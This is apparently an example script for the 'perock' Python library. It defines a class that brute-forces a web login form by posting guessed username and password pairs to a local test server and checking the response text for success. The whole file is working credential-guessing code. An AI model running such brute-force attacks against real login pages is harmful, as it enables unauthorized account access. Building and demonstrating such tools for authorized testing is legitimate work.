import requests

from perock import attack


# The class is part of part of 'examples/setup_attack_class.py'
# Open setup_attack_class.py for more about Attack class
class WebAttack(attack.Attack):
    '''Example Attack class for brutuforcing on webpage login form'''
    def __init__(self, target, data: dict) -> None:
        super().__init__(target, data)
        self._responce: requests.Response

        # requests.exceptions.ConnectionError wont be raised
        # But will be treated as responce
        self.add_unraised_exception(requests.exceptions.ConnectionError)

    @classmethod
    def create_session(cls):
        # Creates session object to use with request
        # This session can improve prformance
        return requests.Session()

    def request(self):
        # Performs request into target and should return responce
        # Reponce can be anything other than None
        # Even exception is seen as responce indicating there was an error.
        session = self.get_session()
        if session == None:
            # session object wasnt provided
            # we then perform request direcly
            return requests.post(self._target, data=self._data)
        else:
            # session would improve request performance
            return session.post(self._target, data=self._data)

    def target_errors(self):
        # Should return True if target experienced errors
        if self.target_reached():
            status_code = self._responce.status_code
            return status_code >= 500 and status_code < 600
        # Target was never reached so no errors
        return False

    def client_errors(self):
        # Should return True if there was error caused by client.
        # This may include exceptions and error on target caused by client.
        if self.target_reached():
            status_code = self._responce.status_code
            return status_code >= 400 and status_code < 500
        # Let super class decide
        # Its possible that exception was raised.
        # Which caused target not to be reached
        return super().client_errors()

    def success(self):
        # Should return True if attack was successful
        # That means target was cracked.
        if self.target_reached():
            # Check if responce bytes contain text
            return b"Login successful" in self._responce.content
        # Not successful as target was not reached
        # There may be client error thats why target not reached
        return False

    def failure(self):
        # Should return True if attack was successful
        # That means it just failed without error
        if self.target_reached():
            # Check if responce bytes contain text
            if b"Failed to login" in self._responce.content:
                return True
            elif b"No such username" in self._responce.content:
                return True
            else:
                return False
        # Since target was not reached, there was never failure
        return False



bruteforce_data = [
    {"username": "PETER", "password": "backspace"},
    {"username": "THOMAS", "password": "titanium"},
    {"username": "MELIH", "password": "universe"},
    {"username": "JORDAN", "password": "notevil"},
    {"username": "SHAWN", "password": "good"},
]


target = "http://127.0.0.1:5000/login"
success_data = []
failure_data = []
errors_data = []

for data in bruteforce_data:
    attack_object = WebAttack(target, data)
    attack_object.start()
    if attack_object.success():
        success_data.append(data)
    elif attack_object.failure():
        failure_data.append(data)
    elif attack_object.errors():
        errors_data.append(data)
    else:
        # Most likey that target was not reached
        err_msg = "Cant decide if thers success, failure or errors"
        raise Exception(err_msg)

print("success_data: ", success_data)
# success_data:  [{'username': 'THOMAS', 'password': 'titanium'}]


# Image what you could do if using threads
# You may be able to use large bruteforce data
# The example does not run in parallel and would be slow.
# Especially on web requests were each request can take few seconds.

# Should we create another example using threads?
# No, runner module already has that covered up.
# Supports threads, asyncio and partially multi-proccessing.
